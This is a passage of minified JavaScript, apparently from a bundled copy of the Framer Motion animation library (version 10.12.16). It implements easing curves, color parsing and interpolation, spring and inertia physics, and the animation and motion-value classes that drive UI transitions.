  sT = { linear: xP, easeIn: GP, easeInOut: KP, easeOut: QP, circIn: tT, circInOut: rT, circOut: nT, backIn: aT, backInOut: iT, backOut: oT, anticipate: (e) => ((e *= 2) < 1 ? 0.5 * aT(e) : 0.5 * (2 - Math.pow(2, -10 * (e - 1)))) },
  lT = (e) => {
      if (Array.isArray(e)) {
          OP(4 === e.length);
          const [t, n, r, o] = e;
          return XP(t, n, r, o);
      }
      return "string" == typeof e ? sT[e] : e;
  },
  cT = (e, t) => (n) => Boolean((s_(n) && i_.test(n) && n.startsWith(e)) || (t && Object.prototype.hasOwnProperty.call(n, t))),
  uT = (e, t, n) => (r) => {
      if (!s_(r)) return r;
      const [o, a, i, s] = r.match(o_);
      return { [e]: parseFloat(o), [t]: parseFloat(a), [n]: parseFloat(i), alpha: void 0 !== s ? parseFloat(s) : 1 };
  },
  dT = { ...e_, transform: (e) => Math.round(((e) => JC(0, 255, e))(e)) },
  fT = {
      test: cT("rgb", "red"),
      parse: uT("red", "green", "blue"),
      transform: ({ red: e, green: t, blue: n, alpha: r = 1 }) => "rgba(" + dT.transform(e) + ", " + dT.transform(t) + ", " + dT.transform(n) + ", " + r_(t_.transform(r)) + ")",
  };
const pT = {
      test: cT("#"),
      parse: function (e) {
          let t = "",
              n = "",
              r = "",
              o = "";
          return (
              e.length > 5
                  ? ((t = e.substring(1, 3)), (n = e.substring(3, 5)), (r = e.substring(5, 7)), (o = e.substring(7, 9)))
                  : ((t = e.substring(1, 2)), (n = e.substring(2, 3)), (r = e.substring(3, 4)), (o = e.substring(4, 5)), (t += t), (n += n), (r += r), (o += o)),
              { red: parseInt(t, 16), green: parseInt(n, 16), blue: parseInt(r, 16), alpha: o ? parseInt(o, 16) / 255 : 1 }
          );
      },
      transform: fT.transform,
  },
  hT = {
      test: cT("hsl", "hue"),
      parse: uT("hue", "saturation", "lightness"),
      transform: ({ hue: e, saturation: t, lightness: n, alpha: r = 1 }) => "hsla(" + Math.round(e) + ", " + u_.transform(r_(t)) + ", " + u_.transform(r_(n)) + ", " + r_(t_.transform(r)) + ")",
  },
  mT = {
      test: (e) => fT.test(e) || pT.test(e) || hT.test(e),
      parse: (e) => (fT.test(e) ? fT.parse(e) : hT.test(e) ? hT.parse(e) : pT.parse(e)),
      transform: (e) => (s_(e) ? e : e.hasOwnProperty("red") ? fT.transform(e) : hT.transform(e)),
  },
  gT = (e, t, n) => -n * e + n * t + e;
function vT(e, t, n) {
  return n < 0 && (n += 1), n > 1 && (n -= 1), n < 1 / 6 ? e + 6 * (t - e) * n : n < 0.5 ? t : n < 2 / 3 ? e + (t - e) * (2 / 3 - n) * 6 : e;
}
const yT = (e, t, n) => {
      const r = e * e;
      return Math.sqrt(Math.max(0, n * (t * t - r) + r));
  },
  bT = [pT, fT, hT];
function xT(e) {
  const t = ((n = e), bT.find((e) => e.test(n)));
  var n;
  let r = t.parse(e);
  return (
      t === hT &&
          (r = (function ({ hue: e, saturation: t, lightness: n, alpha: r }) {
              (e /= 360), (n /= 100);
              let o = 0,
                  a = 0,
                  i = 0;
              if ((t /= 100)) {
                  const r = n < 0.5 ? n * (1 + t) : n + t - n * t,
                      s = 2 * n - r;
                  (o = vT(s, r, e + 1 / 3)), (a = vT(s, r, e)), (i = vT(s, r, e - 1 / 3));
              } else o = a = i = n;
              return { red: Math.round(255 * o), green: Math.round(255 * a), blue: Math.round(255 * i), alpha: r };
          })(r)),
      r
  );
}
const wT = (e, t) => {
  const n = xT(e),
      r = xT(t),
      o = { ...n };
  return (e) => ((o.red = yT(n.red, r.red, e)), (o.green = yT(n.green, r.green, e)), (o.blue = yT(n.blue, r.blue, e)), (o.alpha = gT(n.alpha, r.alpha, e)), fT.transform(o));
};
const ST = { regex: /var\s*\(\s*--[\w-]+(\s*,\s*(?:(?:[^)(]|\((?:[^)(]+|\([^)(]*\))*\))*)+)?\s*\)/g, countKey: "Vars", token: "${v}", parse: xP },
  kT = { regex: a_, countKey: "Colors", token: "${c}", parse: mT.parse },
  ET = { regex: o_, countKey: "Numbers", token: "${n}", parse: e_.parse };
function CT(e, { regex: t, countKey: n, token: r, parse: o }) {
  const a = e.tokenised.match(t);
  a && ((e["num" + n] = a.length), (e.tokenised = e.tokenised.replace(t, r)), e.values.push(...a.map(o)));
}
function _T(e) {
  const t = e.toString(),
      n = { value: t, tokenised: t, values: [], numVars: 0, numColors: 0, numNumbers: 0 };
  return n.value.includes("var(--") && CT(n, ST), CT(n, kT), CT(n, ET), n;
}
function PT(e) {
  return _T(e).values;
}
function TT(e) {
  const { values: t, numColors: n, numVars: r, tokenised: o } = _T(e),
      a = t.length;
  return (e) => {
      let t = o;
      for (let o = 0; o < a; o++) t = o < r ? t.replace(ST.token, e[o]) : o < r + n ? t.replace(kT.token, mT.transform(e[o])) : t.replace(ET.token, r_(e[o]));
      return t;
  };
}
const RT = (e) => ("number" == typeof e ? 0 : e);
const zT = {
      test: function (e) {
          var t, n;
          return isNaN(e) && s_(e) && ((null === (t = e.match(o_)) || void 0 === t ? void 0 : t.length) || 0) + ((null === (n = e.match(a_)) || void 0 === n ? void 0 : n.length) || 0) > 0;
      },
      parse: PT,
      createTransformer: TT,
      getAnimatableNone: function (e) {
          const t = PT(e);
          return TT(e)(t.map(RT));
      },
  },
  AT = (e, t) => (n) => `${n > 0 ? t : e}`;
function jT(e, t) {
  return "number" == typeof e ? (n) => gT(e, t, n) : mT.test(e) ? wT(e, t) : e.startsWith("var(") ? AT(e, t) : NT(e, t);
}
const OT = (e, t) => {
      const n = [...e],
          r = n.length,
          o = e.map((e, n) => jT(e, t[n]));
      return (e) => {
          for (let t = 0; t < r; t++) n[t] = o[t](e);
          return n;
      };
  },
  FT = (e, t) => {
      const n = { ...e, ...t },
          r = {};
      for (const o in n) void 0 !== e[o] && void 0 !== t[o] && (r[o] = jT(e[o], t[o]));
      return (e) => {
          for (const t in r) n[t] = r[t](e);
          return n;
      };
  },
  NT = (e, t) => {
      const n = zT.createTransformer(t),
          r = _T(e),
          o = _T(t);
      return r.numVars === o.numVars && r.numColors === o.numColors && r.numNumbers >= o.numNumbers ? nP(OT(r.values, o.values), n) : AT(e, t);
  },
  MT = (e, t, n) => {
      const r = t - e;
      return 0 === r ? 1 : (n - e) / r;
  },
  LT = (e, t) => (n) => gT(e, t, n);
function BT(e, t, n) {
  const r = [],
      o = n || ("number" == typeof (a = e[0]) ? LT : "string" == typeof a ? (mT.test(a) ? wT : NT) : Array.isArray(a) ? OT : "object" == typeof a ? FT : LT);
  var a;
  const i = e.length - 1;
  for (let s = 0; s < i; s++) {
      let n = o(e[s], e[s + 1]);
      if (t) {
          const e = Array.isArray(t) ? t[s] || xP : t;
          n = nP(e, n);
      }
      r.push(n);
  }
  return r;
}
function IT(e, t, { clamp: n = !0, ease: r, mixer: o } = {}) {
  const a = e.length;
  if ((OP(a === t.length), 1 === a)) return () => t[0];
  e[0] > e[a - 1] && ((e = [...e].reverse()), (t = [...t].reverse()));
  const i = BT(t, r, o),
      s = i.length,
      l = (t) => {
          let n = 0;
          if (s > 1) for (; n < e.length - 2 && !(t < e[n + 1]); n++);
          const r = MT(e[n], e[n + 1], t);
          return i[n](r);
      };
  return n ? (t) => l(JC(e[0], e[a - 1], t)) : l;
}
function DT(e) {
  const t = [0];
  return (
      (function (e, t) {
          const n = e[e.length - 1];
          for (let r = 1; r <= t; r++) {
              const o = MT(0, t, r);
              e.push(gT(n, 1, o));
          }
      })(t, e.length - 1),
      t
  );
}
function $T({ duration: e = 300, keyframes: t, times: n, ease: r = "easeInOut" }) {
  const o = ZP(r) ? r.map(lT) : lT(r),
      a = { done: !1, value: t[0] },
      i = (function (e, t) {
          return e.map((e) => e * t);
      })(n && n.length === t.length ? n : DT(t), e),
      s = IT(i, t, { ease: Array.isArray(o) ? o : ((l = t), (c = o), l.map(() => c || KP).splice(0, l.length - 1)) });
  var l, c;
  return { calculatedDuration: e, next: (t) => ((a.value = s(t)), (a.done = t >= e), a) };
}
function VT(e, t) {
  return t ? e * (1e3 / t) : 0;
}
const UT = 5;
function WT(e, t, n) {
  const r = Math.max(t - UT, 0);
  return VT(n - e(r), t - r);
}
const HT = 0.001,
  qT = 0.01,
  YT = 10,
  XT = 0.05,
  GT = 1;
function QT({ duration: e = 800, bounce: t = 0.25, velocity: n = 0, mass: r = 1 }) {
  let o, a;
  jP(e <= FP(YT));
  let i = 1 - t;
  (i = JC(XT, GT, i)),
      (e = JC(qT, YT, NP(e))),
      i < 1
          ? ((o = (t) => {
                const r = t * i,
                    o = r * e,
                    a = r - n,
                    s = ZT(t, i),
                    l = Math.exp(-o);
                return HT - (a / s) * l;
            }),
            (a = (t) => {
                const r = t * i * e,
                    a = r * n + n,
                    s = Math.pow(i, 2) * Math.pow(t, 2) * e,
                    l = Math.exp(-r),
                    c = ZT(Math.pow(t, 2), i);
                return ((-o(t) + HT > 0 ? -1 : 1) * ((a - s) * l)) / c;
            }))
          : ((o = (t) => Math.exp(-t * e) * ((t - n) * e + 1) - HT), (a = (t) => Math.exp(-t * e) * (e * e * (n - t))));
  const s = (function (e, t, n) {
      let r = n;
      for (let o = 1; o < KT; o++) r -= e(r) / t(r);
      return r;
  })(o, a, 5 / e);
  if (((e = FP(e)), isNaN(s))) return { stiffness: 100, damping: 10, duration: e };
  {
      const t = Math.pow(s, 2) * r;
      return { stiffness: t, damping: 2 * i * Math.sqrt(r * t), duration: e };
  }
}
const KT = 12;
function ZT(e, t) {
  return e * Math.sqrt(1 - t * t);
}
const JT = ["duration", "bounce"],
  eR = ["stiffness", "damping", "mass"];
function tR(e, t) {
  return t.some((t) => void 0 !== e[t]);
}
function nR({ keyframes: e, restDelta: t, restSpeed: n, ...r }) {
  const o = e[0],
      a = e[e.length - 1],
      i = { done: !1, value: o },
      { stiffness: s, damping: l, mass: c, velocity: u, duration: d, isResolvedFromDuration: f } = (function (e) {
          let t = { velocity: 0, stiffness: 100, damping: 10, mass: 1, isResolvedFromDuration: !1, ...e };
          if (!tR(e, eR) && tR(e, JT)) {
              const n = QT(e);
              (t = { ...t, ...n, velocity: 0, mass: 1 }), (t.isResolvedFromDuration = !0);
          }
          return t;
      })(r),
      p = u ? -NP(u) : 0,
      h = l / (2 * Math.sqrt(s * c)),
      m = a - o,
      g = NP(Math.sqrt(s / c)),
      v = Math.abs(m) < 5;
  let y;
  if ((n || (n = v ? 0.01 : 2), t || (t = v ? 0.005 : 0.5), h < 1)) {
      const e = ZT(g, h);
      y = (t) => {
          const n = Math.exp(-h * g * t);
          return a - n * (((p + h * g * m) / e) * Math.sin(e * t) + m * Math.cos(e * t));
      };
  } else if (1 === h) y = (e) => a - Math.exp(-g * e) * (m + (p + g * m) * e);
  else {
      const e = g * Math.sqrt(h * h - 1);
      y = (t) => {
          const n = Math.exp(-h * g * t),
              r = Math.min(e * t, 300);
          return a - (n * ((p + h * g * m) * Math.sinh(r) + e * m * Math.cosh(r))) / e;
      };
  }
  return {
      calculatedDuration: (f && d) || null,
      next: (e) => {
          const r = y(e);
          if (f) i.done = e >= d;
          else {
              let o = p;
              0 !== e && (o = h < 1 ? WT(y, e, r) : 0);
              const s = Math.abs(o) <= n,
                  l = Math.abs(a - r) <= t;
              i.done = s && l;
          }
          return (i.value = i.done ? a : r), i;
      },
  };
}
function rR({ keyframes: e, velocity: t = 0, power: n = 0.8, timeConstant: r = 325, bounceDamping: o = 10, bounceStiffness: a = 500, modifyTarget: i, min: s, max: l, restDelta: c = 0.5, restSpeed: u }) {
  const d = e[0],
      f = { done: !1, value: d },
      p = (e) => (void 0 === s ? l : void 0 === l || Math.abs(s - e) < Math.abs(l - e) ? s : l);
  let h = n * t;
  const m = d + h,
      g = void 0 === i ? m : i(m);
  g !== m && (h = g - d);
  const v = (e) => -h * Math.exp(-e / r),
      y = (e) => g + v(e),
      b = (e) => {
          const t = v(e),
              n = y(e);
          (f.done = Math.abs(t) <= c), (f.value = f.done ? g : n);
      };
  let x, w;
  const S = (e) => {
      var t;
      ((t = f.value), (void 0 !== s && t < s) || (void 0 !== l && t > l)) && ((x = e), (w = nR({ keyframes: [f.value, p(f.value)], velocity: WT(y, e, f.value), damping: o, stiffness: a, restDelta: c, restSpeed: u })));
  };
  return (
      S(0),
      {
          calculatedDuration: null,
          next: (e) => {
              let t = !1;
              return w || void 0 !== x || ((t = !0), b(e), S(e)), void 0 !== x && e > x ? w.next(e - x) : (!t && b(e), f);
          },
      }
  );
}
const oR = (e) => {
      const t = ({ timestamp: t }) => e(t);
      return { start: () => gP.update(t, !0), stop: () => vP(t), now: () => (cP.isProcessing ? cP.timestamp : performance.now()) };
  },
  aR = 2e4;
function iR(e) {
  let t = 0;
  let n = e.next(t);
  for (; !n.done && t < aR; ) (t += 50), (n = e.next(t));
  return t >= aR ? 1 / 0 : t;
}
const sR = { decay: rR, inertia: rR, tween: $T, keyframes: $T, spring: nR };
function lR({ autoplay: e = !0, delay: t = 0, driver: n = oR, keyframes: r, type: o = "keyframes", repeat: a = 0, repeatDelay: i = 0, repeatType: s = "loop", onPlay: l, onStop: c, onComplete: u, onUpdate: d, ...f }) {
  let p,
      h,
      m = 1,
      g = !1;
  const v = () => {
      p && p(),
          (h = new Promise((e) => {
              p = e;
          }));
  };
  let y;
  v();
  const b = sR[o] || $T;
  let x;
  b !== $T && "number" != typeof r[0] && ((x = IT([0, 100], r, { clamp: !1 })), (r = [0, 100]));
  const w = b({ ...f, keyframes: r });
  let S;
  "mirror" === s && (S = b({ ...f, keyframes: [...r].reverse(), velocity: -(f.velocity || 0) }));
  let k = "idle",
      E = null,
      C = null,
      _ = null;
  null === w.calculatedDuration && a && (w.calculatedDuration = iR(w));
  const { calculatedDuration: P } = w;
  let T = 1 / 0,
      R = 1 / 0;
  null !== P && ((T = P + i), (R = T * (a + 1) - i));
  let z = 0;
  const A = (e) => {
          if (null === C) return;
          m > 0 && (C = Math.min(C, e)), (z = null !== E ? E : (e - C) * m);
          const n = z - t,
              o = n < 0;
          (z = Math.max(n, 0)), "finished" === k && null === E && (z = R);
          let l = z,
              c = w;
          if (a) {
              const e = z / T;
              let t = Math.floor(e),
                  n = e % 1;
              !n && e >= 1 && (n = 1), 1 === n && t--, (t = Math.min(t, a + 1));
              const r = Boolean(t % 2);
              r && ("reverse" === s ? ((n = 1 - n), i && (n -= i / T)) : "mirror" === s && (c = S));
              let o = JC(0, 1, n);
              z > R && (o = "reverse" === s && r ? 1 : 0), (l = o * T);
          }
          const u = o ? { done: !1, value: r[0] } : c.next(l);
          x && (u.value = x(u.value));
          let { done: f } = u;
          o || null === P || (f = z >= R);
          const p = null === E && ("finished" === k || ("running" === k && f) || (m < 0 && z <= 0));
          return d && d(u.value), p && F(), u;
      },
      j = () => {
          y && y.stop(), (y = void 0);
      },
      O = () => {
          (k = "idle"), j(), v(), (C = _ = null);
      },
      F = () => {
          (k = "finished"), u && u(), j(), v();
      },
      N = () => {
          if (g) return;
          y || (y = n(A));
          const e = y.now();
          l && l(), null !== E ? (C = e - E) : (C && "finished" !== k) || (C = e), (_ = C), (E = null), (k = "running"), y.start();
      };
  e && N();
  const M = {
      then: (e, t) => h.then(e, t),
      get time() {
          return NP(z);
      },
      set time(e) {
          (e = FP(e)), (z = e), null === E && y && 0 !== m ? (C = y.now() - e / m) : (E = e);
      },
      get duration() {
          const e = null === w.calculatedDuration ? iR(w) : w.calculatedDuration;
          return NP(e);
      },
      get speed() {
          return m;
      },
      set speed(e) {
          e !== m && y && ((m = e), (M.time = NP(z)));
      },
      get state() {
          return k;
      },
      play: N,
      pause: () => {
          (k = "paused"), (E = z);
      },
      stop: () => {
          (g = !0), "idle" !== k && ((k = "idle"), c && c(), O());
      },
      cancel: () => {
          null !== _ && A(_), O();
      },
      complete: () => {
          k = "finished";
      },
      sample: (e) => ((C = 0), A(e)),
  };
  return M;
}
const cR = new Set(["opacity", "clipPath", "filter", "transform", "backgroundColor"]);
function uR(e, t, { onUpdate: n, onComplete: r, ...o }) {
  if (!(WP.waapi() && cR.has(t) && !o.repeatDelay && "mirror" !== o.repeatType && 0 !== o.damping && "inertia" !== o.type)) return !1;
  let a,
      i,
      s = !1;
  const l = () => {
      i = new Promise((e) => {
          a = e;
      });
  };
  l();
  let { keyframes: c, duration: u = 300, ease: d, times: f } = o;
  if (((e, t) => "spring" === t.type || "backgroundColor" === e || !BP(t.ease))(t, o)) {
      const e = lR({ ...o, repeat: 0, delay: 0 });
      let t = { done: !1, value: c[0] };
      const n = [];
      let r = 0;
      for (; !t.done && r < 2e4; ) (t = e.sample(r)), n.push(t.value), (r += 10);
      (f = void 0), (c = n), (u = r - 10), (d = "linear");
  }
  const p = (function (e, t, n, { delay: r = 0, duration: o, repeat: a = 0, repeatType: i = "loop", ease: s, times: l } = {}) {
          const c = { [t]: n };
          l && (c.offset = l);
          const u = $P(s);
          return Array.isArray(u) && (c.easing = u), e.animate(c, { delay: r, duration: o, easing: Array.isArray(u) ? "linear" : u, fill: "both", iterations: a + 1, direction: "reverse" === i ? "alternate" : "normal" });
      })(e.owner.current, t, c, { ...o, duration: u, ease: d, times: f }),
      h = () => p.cancel(),
      m = () => {
          gP.update(h), a(), l();
      };
  return (
      (p.onfinish = () => {
          e.set(
              (function (e, { repeat: t, repeatType: n = "loop" }) {
                  return e[t && "loop" !== n && t % 2 == 1 ? 0 : e.length - 1];
              })(c, o)
          ),
              r && r(),
              m();
      }),
      {
          then: (e, t) => i.then(e, t),
          get time() {
              return NP(p.currentTime || 0);
          },
          set time(e) {
              p.currentTime = FP(e);
          },
          get speed() {
              return p.playbackRate;
          },
          set speed(e) {
              p.playbackRate = e;
          },
          get duration() {
              return NP(u);
          },
          play: () => {
              s || (p.play(), vP(h));
          },
          pause: () => p.pause(),
          stop: () => {
              if (((s = !0), "idle" === p.playState)) return;
              const { currentTime: t } = p;
              if (t) {
                  const n = lR({ ...o, autoplay: !1 });
                  e.setWithVelocity(n.sample(t - 10).value, n.sample(t).value, 10);
              }
              m();
          },
          complete: () => p.finish(),
          cancel: m,
      }
  );
}
const dR = { type: "spring", stiffness: 500, damping: 25, restSpeed: 10 },
  fR = { type: "keyframes", duration: 0.8 },
  pR = { type: "keyframes", ease: [0.25, 0.1, 0.35, 1], duration: 0.3 },
  hR = (e, { keyframes: t }) => (t.length > 2 ? fR : WC.has(e) ? (e.startsWith("scale") ? { type: "spring", stiffness: 550, damping: 0 === t[1] ? 2 * Math.sqrt(550) : 30, restSpeed: 10 } : dR) : pR),
  mR = (e, t) => "zIndex" !== e && (!("number" != typeof t && !Array.isArray(t)) || !("string" != typeof t || (!zT.test(t) && "0" !== t) || t.startsWith("url("))),
  gR = new Set(["brightness", "contrast", "saturate", "opacity"]);
function vR(e) {
  const [t, n] = e.slice(0, -1).split("(");
  if ("drop-shadow" === t) return e;
  const [r] = n.match(o_) || [];
  if (!r) return e;
  const o = n.replace(r, "");
  let a = gR.has(t) ? 1 : 0;
  return r !== n && (a *= 100), t + "(" + a + o + ")";
}
const yR = /([a-z-]*)\(.*?\)/g,
  bR = {
      ...zT,
      getAnimatableNone: (e) => {
          const t = e.match(yR);
          return t ? t.map(vR).join(" ") : e;
      },
  },
  xR = { ...g_, color: mT, backgroundColor: mT, outlineColor: mT, fill: mT, stroke: mT, borderColor: mT, borderTopColor: mT, borderRightColor: mT, borderBottomColor: mT, borderLeftColor: mT, filter: bR, WebkitFilter: bR },
  wR = (e) => xR[e];
function SR(e, t) {
  let n = wR(e);
  return n !== bR && (n = zT), n.getAnimatableNone ? n.getAnimatableNone(t) : void 0;
}
const kR = (e) => /^0[^.\s]+$/.test(e);
function ER(e) {
  return "number" == typeof e ? 0 === e : null !== e ? "none" === e || "0" === e || kR(e) : void 0;
}
function CR(e, t) {
  return e[t] || e.default || e;
}
const _R = (e, t, n, r = {}) => (o) => {
  const a = CR(r, e) || {},
      i = a.delay || r.delay || 0;
  let { elapsed: s = 0 } = r;
  s -= FP(i);
  const l = (function (e, t, n, r) {
          const o = mR(t, n);
          let a;
          a = Array.isArray(n) ? [...n] : [null, n];
          const i = void 0 !== r.from ? r.from : e.get();
          let s;
          const l = [];
          for (let c = 0; c < a.length; c++) null === a[c] && (a[c] = 0 === c ? i : a[c - 1]), ER(a[c]) && l.push(c), "string" == typeof a[c] && "none" !== a[c] && "0" !== a[c] && (s = a[c]);
          if (o && l.length && s) for (let c = 0; c < l.length; c++) a[l[c]] = SR(t, s);
          return a;
      })(t, e, n, a),
      c = l[0],
      u = l[l.length - 1],
      d = mR(e, c),
      f = mR(e, u);
  let p = {
      keyframes: l,
      velocity: t.getVelocity(),
      ease: "easeOut",
      ...a,
      delay: -s,
      onUpdate: (e) => {
          t.set(e), a.onUpdate && a.onUpdate(e);
      },
      onComplete: () => {
          o(), a.onComplete && a.onComplete();
      },
  };
  if (
      ((function ({ when: e, delay: t, delayChildren: n, staggerChildren: r, staggerDirection: o, repeat: a, repeatType: i, repeatDelay: s, from: l, elapsed: c, ...u }) {
          return !!Object.keys(u).length;
      })(a) || (p = { ...p, ...hR(e, p) }),
      p.duration && (p.duration = FP(p.duration)),
      p.repeatDelay && (p.repeatDelay = FP(p.repeatDelay)),
      !d || !f || MP || !1 === a.type)
  )
      return (function ({ keyframes: e, delay: t, onUpdate: n, onComplete: r }) {
          const o = () => (n && n(e[e.length - 1]), r && r(), { time: 0, speed: 1, duration: 0, play: xP, pause: xP, stop: xP, then: (e) => (e(), Promise.resolve()), cancel: xP, complete: xP });
          return t ? lR({ keyframes: [0, 1], duration: 0, delay: t, onComplete: o }) : o();
      })(p);
  if (t.owner && t.owner.current instanceof HTMLElement && !t.owner.getProps().onUpdate) {
      const n = uR(t, e, p);
      if (n) return n;
  }
  return lR(p);
};
function PR(e) {
  return Boolean(qC(e) && e.add);
}
function TR(e, t) {
  -1 === e.indexOf(t) && e.push(t);
}
function RR(e, t) {
  const n = e.indexOf(t);
  n > -1 && e.splice(n, 1);
}
class zR {
  constructor() {
      this.subscriptions = [];
  }
  add(e) {
      return TR(this.subscriptions, e), () => RR(this.subscriptions, e);
  }
  notify(e, t, n) {
      const r = this.subscriptions.length;
      if (r)
          if (1 === r) this.subscriptions[0](e, t, n);
          else
              for (let o = 0; o < r; o++) {
                  const r = this.subscriptions[o];
                  r && r(e, t, n);
              }
  }
  getSize() {
      return this.subscriptions.length;
  }
  clear() {
      this.subscriptions.length = 0;
  }
}
class AR {
  constructor(e, t = {}) {
      var n;
      (this.version = "10.12.16"),
          (this.timeDelta = 0),
          (this.lastUpdated = 0),
          (this.canTrackVelocity = !1),
          (this.events = {}),
          (this.updateAndNotify = (e, t = !0) => {
              (this.prev = this.current), (this.current = e);
              const { delta: n, timestamp: r } = cP;
              this.lastUpdated !== r && ((this.timeDelta = n), (this.lastUpdated = r), gP.postRender(this.scheduleVelocityCheck)),
                  this.prev !== this.current && this.events.change && this.events.change.notify(this.current),
                  this.events.velocityChange && this.events.velocityChange.notify(this.getVelocity()),
                  t && this.events.renderRequest && this.events.renderRequest.notify(this.current);
          }),
          (this.scheduleVelocityCheck = () => gP.postRender(this.velocityCheck)),
          (this.velocityCheck = ({ timestamp: e }) => {
              e !== this.lastUpdated && ((this.prev = this.current), this.events.velocityChange && this.events.velocityChange.notify(this.getVelocity()));
          }),
          (this.hasAnimated = !1),
          (this.prev = this.current = e),
          (this.canTrackVelocity = ((n = this.current), !isNaN(parseFloat(n)))),
          (this.owner = t.owner);
  }
  onChange(e) {
      return this.on("change", e);
  }
  on(e, t) {
      this.events[e] || (this.events[e] = new zR());
      const n = this.events[e].add(t);
      return "change" === e
          ? () => {
                n(),
                    gP.read(() => {
                        this.events.change.getSize() || this.stop();
                    });
            }
          : n;
  }
  clearListeners() {
      for (const e in this.events) this.events[e].clear();
  }
  attach(e, t) {
      (this.passiveEffect = e), (this.stopPassiveEffect = t);
  }
  set(e, t = !0) {
      t && this.passiveEffect ? this.passiveEffect(e, this.updateAndNotify) : this.updateAndNotify(e, t);
  }
  setWithVelocity(e, t, n) {
      this.set(t), (this.prev = e), (this.timeDelta = n);
  }
  jump(e) {
      this.updateAndNotify(e), (this.prev = e), this.stop(), this.stopPassiveEffect && this.stopPassiveEffect();
  }
  get() {
      return this.current;
  }
  getPrevious() {
      return this.prev;
  }
  getVelocity() {
      return this.canTrackVelocity ? VT(parseFloat(this.current) - parseFloat(this.prev), this.timeDelta) : 0;
  }
  start(e) {
      return (
          this.stop(),
          new Promise((t) => {
              (this.hasAnimated = !0), (this.animation = e(t)), this.events.animationStart && this.events.animationStart.notify();
          }).then(() => {
              this.events.animationComplete && this.events.animationComplete.notify(), this.clearAnimation();
          })
      );
  }
  stop() {
      this.animation && (this.animation.stop(), this.events.animationCancel && this.events.animationCancel.notify()), this.clearAnimation();
  }
  isAnimating() {
      return !!this.animation;
  }
  clearAnimation() {
      delete this.animation;
  }
  destroy() {
      this.clearListeners(), this.stop(), this.stopPassiveEffect && this.stopPassiveEffect();
  }
}
function jR(e, t) {
  return new AR(e, t);
}
const OR = (e) => (t) => t.test(e),
  FR = [e_, d_, u_, c_, p_, f_, { test: (e) => "auto" === e, parse: (e) => e }],
  NR = (e) => FR.find(OR(e)),
  MR = [...FR, mT, zT],
  LR = (e) => MR.find(OR(e));
function BR(e, t, n) {
  e.hasValue(t) ? e.getValue(t).set(n) : e.addValue(t, jR(n));
}
function IR(e, t) {
  if (!t) return;
  return (t[e] || t.default || t).from;
}
function DR({ protectedKeys: e, needsAnimating: t }, n) {
  const r = e.hasOwnProperty(n) && !0 !== t[n];
  return (t[n] = !1), r;
}
function $R(e, t, { delay: n = 0, transitionOverride: r, type: o } = {}) {
  let { transition: a = e.getDefaultTransition(), transitionEnd: i, ...s } = e.makeTargetAnimatable(t);
  const l = e.getValue("willChange");
  r && (a = r);
  const c = [],
      u = o && e.animationState && e.animationState.getState()[o];
  for (const d in s) {
      const t = e.getValue(d),
          r = s[d];
      if (!t || void 0 === r || (u && DR(u, d))) continue;
      const o = { delay: n, elapsed: 0, ...a };
      if (window.HandoffAppearAnimations && !t.hasAnimated) {
          const n = e.getProps()[AP];
          n && (o.elapsed = window.HandoffAppearAnimations(n, d, t, gP));
      }
      t.start(_R(d, t, r, e.shouldReduceMotion && WC.has(d) ? { type: !1 } : o));
      const i = t.animation;
      PR(l) && (l.add(d), i.then(() => l.remove(d))), c.push(i);
  }
  return (
      i &&
          Promise.all(c).then(() => {
              i &&
                  (function (e, t) {
                      const n = zP(e, t);
                      let { transitionEnd: r = {}, transition: o = {}, ...a } = n ? e.makeTargetAnimatable(n, !1) : {};
                      a = { ...a, ...r };
                      for (const i in a) BR(e, i, W_(a[i]));
                  })(e, i);
          }),
      c
  );
}
function VR(e, t, n = {}) {
  const r = zP(e, t, n.custom);
  let { transition: o = e.getDefaultTransition() || {} } = r || {};
  n.transitionOverride && (o = n.transitionOverride);
  const a = r ? () => Promise.all($R(e, r, n)) : () => Promise.resolve(),
      i =
          e.variantChildren && e.variantChildren.size
              ? (r = 0) => {
                    const { delayChildren: a = 0, staggerChildren: i, staggerDirection: s } = o;
                    return (function (e, t, n = 0, r = 0, o = 1, a) {
                        const i = [],
                            s = (e.variantChildren.size - 1) * r,
                            l = 1 === o ? (e = 0) => e * r : (e = 0) => s - e * r;
                        return (
                            Array.from(e.variantChildren)
                                .sort(UR)
                                .forEach((e, r) => {
                                    e.notify("AnimationStart", t), i.push(VR(e, t, { ...a, delay: n + l(r) }).then(() => e.notify("AnimationComplete", t)));
                                }),
                            Promise.all(i)
                        );
                    })(e, t, a + r, i, s, n);
                }
              : () => Promise.resolve(),
      { when: s } = o;
  if (s) {
      const [e, t] = "beforeChildren" === s ? [a, i] : [i, a];
      return e().then(() => t());
  }
  return Promise.all([a(), i(n.delay)]);
}
function UR(e, t) {
  return e.sortNodePosition(t);
}
const WR = [..._C].reverse(),
  HR = _C.length;
function qR(e) {
  return (t) =>
      Promise.all(
          t.map(({ animation: t, options: n }) =>
              (function (e, t, n = {}) {
                  let r;
                  if ((e.notify("AnimationStart", t), Array.isArray(t))) {
                      const o = t.map((t) => VR(e, t, n));
                      r = Promise.all(o);
                  } else if ("string" == typeof t) r = VR(e, t, n);
                  else {
                      const o = "function" == typeof t ? zP(e, t, n.custom) : t;
                      r = Promise.all($R(e, o, n));
                  }
                  return r.then(() => e.notify("AnimationComplete", t));
              })(e, t, n)
          )
      );
}
function YR(e) {
  let t = qR(e);
  const n = { animate: GR(!0), whileInView: GR(), whileHover: GR(), whileTap: GR(), whileDrag: GR(), whileFocus: GR(), exit: GR() };
  let r = !0;
  const o = (t, n) => {
      const r = zP(e, n);
      if (r) {
          const { transition: e, transitionEnd: n, ...o } = r;
          t = { ...t, ...o, ...n };
      }
      return t;
  };
  function a(a, i) {
      const s = e.getProps(),
          l = e.getVariantContext(!0) || {},
          c = [],
          u = new Set();
      let d = {},
          f = 1 / 0;
      for (let t = 0; t < HR; t++) {
          const p = WR[t],
              h = n[p],
              m = void 0 !== s[p] ? s[p] : l[p],
              g = EC(m),
              v = p === i ? h.isActive : null;
          !1 === v && (f = t);
          let y = m === l[p] && m !== s[p] && g;
          if ((y && r && e.manuallyAnimateOnMount && (y = !1), (h.protectedKeys = { ...d }), (!h.isActive && null === v) || (!m && !h.prevProp) || CC(m) || "boolean" == typeof m)) continue;
          const b = XR(h.prevProp, m);
          let x = b || (p === i && h.isActive && !y && g) || (t > f && g);
          const w = Array.isArray(m) ? m : [m];
          let S = w.reduce(o, {});
          !1 === v && (S = {});
          const { prevResolvedValues: k = {} } = h,
              E = { ...k, ...S },
              C = (e) => {
                  (x = !0), u.delete(e), (h.needsAnimating[e] = !0);
              };
          for (const e in E) {
              const t = S[e],
                  n = k[e];
